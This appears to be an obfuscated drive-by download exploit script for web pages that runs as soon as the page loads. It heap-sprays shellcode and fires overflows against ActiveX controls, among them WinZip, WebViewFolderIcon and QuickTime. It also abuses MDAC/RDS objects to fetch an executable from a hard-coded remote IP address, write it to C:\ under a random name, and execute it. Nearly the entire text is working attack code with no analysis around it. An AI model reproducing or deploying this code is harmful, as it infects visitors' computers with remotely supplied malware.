 

var mm = new Array();
var mem_flag = 0;

function h() {mm=mm; setTimeout("h()", 2000);}

function getb(b, bSize)
{while (b.length*2<bSize){b += b;}
b = b.substring(0,bSize/2);return b;}

function cf()
{var zc = 0x0d0d0d0d;
var a = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33" +
"%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb" +
"%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7" +
"%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96" +
"%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85" +
"%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa" +
"%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf" +
"%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc" +
"%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba" +
"%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec" +
"%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c" +
"%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4" +
"%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07" +
"%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u372F%u2E31%u3038%u322E%u2E33%u3032%u2F38%u6966%u656C%u702E%u7068");
	var heapBlockSize = 0x400000;
	var pls = a.length * 2;
	var bSize = heapBlockSize - (pls+0x38);
	var b = unescape("%u0c0c%u0c0c");	b = getb(b,bSize);
	heapBlocks = (zc - 0x400000)/heapBlockSize;
	
	for (i=0;i<heapBlocks;i++)
	{mm[i] = b + a;}

	mem_flag = 1;
	h();
	return mm;
}



function startWinZip(object)
{
	var xh = 'A';	while (xh.length < 231) xh+='A';	xh+="\x0c\x0c\x0c\x0c\x0c\x0c\x0c";	object.CreateNewFolderFromName(xh);
}
function startWVF()
{
	for (i=0;i<128;i++)
	{
		try{			var tar = new ActiveXObject('WebVi'+'ewFol'+'de'+'rIc'+'on.WebVi'+'ewFol'+'derI'+'con.1');
			d = 0x7ffffffe;
			b = 0x0c0c0c0c
			tar.setSlice(d, b, b, b ); 
		}catch(e){}
	}
}


function elea(){
var url="http://xa";var outValue='';for(i=0;i<url.length;){outValue+='%u'+url.charCodeAt(i+1).toString(16)+url.charCodeAt(i).toString(16);i=i+2;}
x=unescape("%u9090%u9090%u9090%u3390%u33c0%uebc9%u5e12%ub966%uf400%ufe8b%u2e80%u800b%u0936%ue246%uebf7%ue805%uffe9%uffff%uaeeb%u1414%u6114%ub378%u1444%u1414%u548d%u8d10%u2084%u8daf%u0c6c%u098d%u186e%uec5b%u144e%u1414%ufbf6%u716c%u1472%u6c14%u8687%u6f70%u0168%u8d2a%uecec%u1448%u1414%uf095%u8d34%u6ee0%u6534%u6a01%ud918%u1c18%u7560%u8784%u58d9%u181c%u7732%u777c%u58da%u0c1c%u4514%u64d4%u6564%u6469%u6a01%u8d24%u6ee0%u6517%u6a01%u010c%u106a%u6a63%u878d%u8d40%u4788%u157c%u6a07%u8a8d%u1534%u4507%u4bcb%uaf53%ud715%udd45%uc211%u3c24%u8806%ud30c%u0fcd%ude15%ued54%u3d03%u8721%u62f9%u628d%u1538%u7adf%u108d%u8d4d%u2062%udf15%u188d%u158d%uadd7%u5b62%uecd5%u0163%u0101%u5292%uf012%uddef%ufcf0%u029c%u128e%udc82%u85f6%u1e4a%u8431%u886C%u8488%u313E%u4931%u3243%u443C%u4632%u3245%u4446%u313C%u6B7A%u7770%u8432%u846C%u1414%u1414%u1414%u1414%u1414%u1414%u1414%u1414"+outValue);
y=unescape("%u0d0d%u0d0d");while(y.length<0x40000)y+=y;y=y.substring(0,0x3ffe4-x.length);o=new Array();for(i=0;i<450;i++)o[i]=y+x;z=Math.ceil(0xd0d0d0d);
document.write('<object classid="CLSID:EC444CB6-3E7E-4865-B1C3-0DE72EF39B3F"></object>');
z=document.scripts[0].createControlRange().length;
}

function yah()
{
try {
document.write("<object classid='"+"clsid:9D39223E-AE8E-1"+"1D4-8FD3-00D0B77302"+"77' id='ta"+"rget'></"+"object>");
myBuff = '\x0a'; 
while (myBuff.length < 5000) myBuff += '\x0a\x0a\x0a\x0a'; 
eval(String.fromCharCode(116,97,114,103,101,116,46,115,101,114)+"ver = myBuff;");
eval("target"+"."+String.fromCharCode(114,101,99,101,105,118,101,40,41)+";");
} catch(e) { return 0; }
}


function startOverflow(num)

{

	if (num == 0) {

		try {
				if (! mem_flag) cf();
				yah();
				elea();
				
			var qt = new ActiveXObject('Quick'+'Time.Qu'+'ickTime');		

			if (qt) {

				var qthtml = '<object CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="1" height="1" style="border:0px">'+

				'<param name="src" value="qt.php">'+

				'<param name="autoplay" value="true">'+

				'<param name="loop" value="false">'+

				'<param name="controller" value="true">'+

				'</object>';

				if (! mem_flag) cf();

				document.getElementById('myd'+'iv').innerHTML = qthtml;

				num = 255;

			}

		} catch(e) { }



		if (num = 255) setTimeout("startOverflow(1)", 2000);

		else startOverflow(1);



	} else if (num == 1) {

		try {

			var winzip = document.createElement("object");

			winzip.setAttribute("classid", "clsid:A09AE6"+"8F-B14D-43"+"ED-B713-BA413"+"F034904");



			var ret=winzip.CreateNewFolderFromName(unescape("%00"));

			if (ret == false) {

				if (! mem_flag) cf();

				startWinZip(winzip);

				num = 255;

			}



		} catch(e) { }



		if (num = 255) setTimeout("startOverflow(2)", 2000);

		else startOverflow(2);



	} else if (num == 2) {



		try {

			var tar = new ActiveXObject('WebVi'+'ewFol'+'derIc'+'on.WebVi'+'ewFol'+'derI'+'con.1');

			if (tar) {

				if (! mem_flag) cf();

				startWVF();

			}

		} catch(e) { }





	}

}



function GetRandString(len)
{
	var chars = "abcdefghiklmnopqrstuvwxyz";
	var string_length = len;
	var randomstring = '';
	for (var i=0; i<string_length; i++) {
		var rnum = Math.floor(Math.random() * chars.length);
		randomstring += chars.substring(rnum,rnum+1);
	}

	return randomstring;
}

function CreateObject(CLSID, name) {
	var r = null;
	try { eval('r = CLSID.CreateObject(name)') }catch(e){}	
	if (!r) { try {s=1; eval('r = CLSID.CreateObject(name, "")') }catch(e){} }
	if (!r) { try {s=1; eval('r = CLSID.CreateObject(name, "", "")') }catch(e){} }
	if (!r) { try {s=1; eval('r = CLSID.GetObject("", name)') }catch(e){} }
	if (!r) { try {s=1; eval('r = CLSID.GetObject(name, "")') }catch(e){} }
	if (!r) { try {s=1; eval('r = CLSID.GetObject(name)') }catch(e){} }
	return(r);
}

function XMLHttpDownload(xml, url) {

	try {
		xml.open("GET", url, false);
		xml.send(null);

	} catch(e) { return 0; }

	return xml.responseBody;
}

function ADOBDStreamSave(o, name, data) {

	try {
		o.Type = 1;
		o.Mode = 3;
		o.Open();
		o.Write(data);
		o.SaveToFile(name, 2);
		o.Close();
	} catch(e) { return 0; }

	return 1;
}

function ShellExecute(exec, name, type) {

	if (type == 0) {
		try { exec.Run(name, 0); return 1; } catch(e) { }
	} else {
		try { exe.ShellExecute(name); return 1; } catch(e) { }
	}

	return(0);

}

function MDAC() {
	var t = new Array('{BD96C5'+'56-65A3-11'+'D0-983A-00C04FC'+'29E30}', '{BD96C'+'556-65A3-11'+'D0-983A-00C0'+'4FC29E36}', '{AB9B'+'CEDD-EC7E-47'+'E1-9322-D4A21'+'0617116}', '{0006F'+'033-0000-0000-C000-000000'+'000046}', '{0006'+'F03A-0000-0000-C000-0000000'+'00046}', '{6e32'+'070a-766d-4ee6-879c-dc1fa'+'91d2fc3}', '{6414'+'512B-B978-451D-A0D8-FCFDF3'+'3E833C}', '{7F5B'+'7F63-F06F-4331-8A26-339E03'+'C0AE3D}', '{0672'+'3E09-F4C2-43'+'c8-8358-09FCD1D'+'B0766}', '{639F'+'725F-1B2D-48'+'31-A9FD-87484'+'7682010}', '{BA018'+'599-1DB3-44f'+'9-83B4-46145'+'4C84BF8}', '{D0C07'+'D56-7C69-43F1-B4'+'A0-25F5A1'+'1FAB19}', '{E8C'+'CCDDF-CA28-496b-B'+'050-6C07C962'+'476B}', null);
	var v = new Array(null, null, null);
	var i = 0;
	var n = 0;
	var ret = 0;
	var urlRealExe = 'http://71.80.23.208/file.php';

	while (t[i] && (! v[0] || ! v[1] || ! v[2]) ) {
		var a = null;

		try {
			a = document.createElement("object");
			a.setAttribute("classid", "clsid:" + t[i].substring(1, t[i].length - 1));
		} catch(e) { a = null; }
		
		if (a) {
			if (! v[0]) {
				v[0] = CreateObject(a, "msxml2.XMLHTTP");
				if (! v[0]) v[0] = CreateObject(a, "Microso"+"ft.XM"+"LHT"+"TP");
				if (! v[0]) v[0] = CreateObject(a, "MSX"+"ML2.Se"+"rverXM"+"LHT"+"TP");
			}

			if (! v[1]) {
				v[1] = CreateObject(a, "ADODB.Str"+"eam");
			}

			if (! v[2]) {
				v[2] = CreateObject(a, "WSc"+"ript.Sh"+"ell");
				if (! v[2]) {
					v[2] = CreateObject(a, "Shel"+"l.Ap"+"pl"+"icati"+"on");
					if (v[2]) n=1;
				}
			}
		}

		i++;
	}

	if (v[0] && v[1] && v[2]) {
		var data = XMLHttpDownload(v[0], urlRealExe);
		if (data != 0) {
			var name = "c:\\sys"+GetRandString(4)+".exe";
			if (ADOBDStreamSave(v[1], name, data) == 1) {
				if (ShellExecute(v[2], name, n) == 1) {
					ret=1;
				}
			}
		}
	}

	return ret;
}






function start() {

	if (! MDAC() ) { startOverflow(0); }
}



start();
